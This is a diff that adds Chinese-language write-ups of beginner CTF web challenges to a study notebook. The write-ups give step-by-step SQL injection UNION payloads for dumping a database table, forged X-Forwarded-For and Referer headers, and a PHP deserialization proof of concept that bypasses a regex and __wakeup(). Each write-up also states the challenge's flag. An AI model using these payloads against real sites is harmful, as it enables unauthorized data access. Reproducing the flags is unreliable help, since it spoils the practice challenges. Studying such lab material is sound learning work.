@@ -296,7 +296,7 @@ highlight_file(__FILE__);
 
 ### unseping
 
-题解：
+题解：高难度进阶题！！！！
 
 知识点：反序列化、命令执行绕过、空格绕过、空环境变量绕过
 
@@ -347,3 +347,144 @@ $ctf=@$_POST['ctf'];
 @unserialize(base64_decode($ctf));
 ?>
 ```
+
+> 暂时弃坑，我连答案都看不懂
+
+<br>
+
+### newscenter
+
+题解：sql 注入
+
+打开网站，发现是一个新闻页面，附带一个搜索框；  
+从搜索框下手，进行 sql 注入
+
+<br>
+
+开启 burp 的监听模式，随意在搜索框中输入一些字符然后拦截，把拦截内容发到 repeater 里面去
+
+首先判断能否联合查询，我们输入以下判断语句报错，表示对应 3 个元素：  
+`1' order by 4 -- -`
+
+测试一下获取当前数据库版本与数据库名称（mysql5.0+才有 information_schema）  
+`-1' union select 1,version(),database() -- -`
+
+![](../imgs/contest/xctf_noob/xn2.png)
+
+发现为 5.0+版本且数据库名称为 news，直接查找该数据库下有哪些数据表  
+根据返回结果得到俩表：news 和 secret_table，显然后者必定存在 flag  
+`-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='news' -- -`
+
+查看数据表 secret_table 下列名称  
+发现存在两列：id 和 fl4g  
+`-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='secret_table' -- -`
+
+最后查看 fl4g 的内容即可得到 flag  
+`-1' union select 1,2,group_concat(fl4g) from secret_table -- -`
+
+> 答案：QCTF{sq1_inJec7ion_ezzz}
+
+<br>
+
+### xff_referer
+
+题解：burp 抓包伪造 x-forwarded-for 以及 referer
+
+直接 burp 抓打开网站的包，发到 repeater
+
+直接在请求头末尾（不要画蛇添足加多余的换行符或者空格！！！）添加以下两行  
+`X-Forwarded-For: 123.123.123.123`  
+`Referer: https://www.google.com`
+
+> 之后 send 就能拿到 flag 了
+
+<br>
+
+X-Forwarded-For：用来识别通过 HTTP 代理或负载均衡方式连接到 Web 服务器的客户端最原始的 IP 地址的 HTTP 头字段
+
+Referer：包含了当前请求页面的来源页面的地址，服务端以此验证访问来源
+
+<br>
+
+### Web_php_unserialize
+
+题解：阅读理解题，反序列化
+
+```php
+<?php
+class Demo {
+    private $file = 'index.php';
+    public function __construct($file) {
+        $this->file = $file;
+    }
+    function __destruct() {
+        echo @highlight_file($this->file, true);
+    }
+    function __wakeup() {
+        if ($this->file != 'index.php') {
+            //the secret is in the fl4g.php
+            $this->file = 'index.php';
+        }
+    }
+}
+
+if (isset($_GET['var'])) {
+    $var = base64_decode($_GET['var']);
+    if (preg_match('/[oc]:\d+:/i', $var)) {
+        die('stop hacking!');
+    } else {
+        @unserialize($var);
+    }
+} else {
+    highlight_file("index.php");
+}
+?>
+```
+
+可见我们需要传参 var，且 flag 保存的文件位置为 fl4g.php  
+分别需要绕过正则以及`__wakeup()`函数
+
+故得出以下 POC
+
+```php
+<?php
+
+class Demo
+{
+    private $file = 'index.php';
+
+    // 构造函数，new对象时调用
+    public function __construct($file)
+    {
+        $this->file = $file;
+    }
+
+    // 析构函数，销毁对象时调用
+    function __destruct()
+    {
+        echo @highlight_file($this->file, true);
+    }
+
+    // 魔法函数，反序列化时调用
+    function __wakeup()
+    {
+        if ($this->file != 'index.php') {
+            $this->file = 'index.php';
+        }
+    }
+}
+
+// 根据fl4g.php构造序列化内容
+$demo = new Demo("fl4g.php");
+$serial = serialize($demo);
+echo $serial; // O:4:"Demo":1:{s:10:" Demo file";s:8:"fl4g.php";}
+
+$serial = str_replace('O:4', 'O:+4', $serial); // 绕过正则
+$serial = str_replace(':1:', ':2:', $serial);  // 绕过__wakeup()
+$serial = str_replace(' ', '%00', $serial);    // 替换掉因序列化保护机制而多生成的空格
+echo base64_encode($serial);  // TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==
+```
+
+> 将 payload 带入 url 执行后可得 flag：ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}
+
+<br>
